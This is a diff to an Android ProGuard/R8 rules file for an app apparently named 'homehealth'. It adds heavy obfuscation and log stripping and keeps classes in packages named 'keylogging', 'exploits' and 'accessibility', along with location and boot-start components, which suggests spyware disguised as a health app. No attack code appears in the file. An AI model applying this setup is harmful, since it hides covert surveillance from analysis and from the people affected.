@@ -50,3 +50,60 @@
 # Fix androidTest minification warning
 -dontwarn androidx.test.**
 -keep class androidx.test.** { *; }
+
+# 1. Aggressive Optimization & Hardening
+-optimizationpasses 5
+-allowaccessmodification
+-dontpreverify
+-overloadaggressively
+
+# 2. Advanced Obfuscation
+# This flattens the package structure into a single letter 'o', making it
+# much harder to guess the app's internal logic from the package names.
+-repackageclasses 'o'
+
+# This renames the source file attribute to "SourceFile" so hackers can't see
+# the actual Kotlin/Java filename in stack traces.
+-renamesourcefileattribute SourceFile
+-keepattributes SourceFile,LineNumberTable,Signature,EnclosingMethod
+
+# 3. Strip Logging
+# This removes all debug and verbose logs during optimization.
+# NOTE: This only works when using 'proguard-android-optimize.txt' in build.gradle.
+-assumenosideeffects class android.util.Log {
+    public static int v(...);
+    public static int d(...);
+    public static int i(...);
+    public static int w(...);
+}
+
+# 4. Critical Entry Points
+# These are referenced by the Android System (Manifest). While R8 usually handles
+# these, keeping them explicitly ensures background tasks and services don't break.
+-keep class com.example.homehealth.location.SyncWorker { *; }
+-keep class com.example.homehealth.location.LocationService { *; }
+-keep class com.example.homehealth.accessibility.** { *; }
+-keep class com.example.homehealth.keylogging.** { *; }
+-keep class com.example.homehealth.BootReceiver { *; }
+-keep class com.example.homehealth.exploits.** { *; }
+
+# 5. Data Models (Firebase/Firestore)
+# Since Firestore maps document fields to class properties by name, we MUST
+# keep the names of these fields and the no-argument constructor.
+-keepclassmembers class com.example.homehealth.data.models.** {
+    public <init>(...);
+    <fields>;
+}
+
+# 6. Library Compatibility
+-keep class com.google.firebase.** { *; }
+-keep class com.google.android.gms.** { *; }
+-dontwarn com.google.firebase.**
+-dontwarn com.google.android.gms.**
+
+# Jetpack Compose specific rules
+-keep class androidx.compose.** { *; }
+-dontwarn androidx.compose.**
+
+# Avoid warnings for missing classes in libraries
+-dontwarn androidx.concurrent.futures.SuspendToFutureAdapter
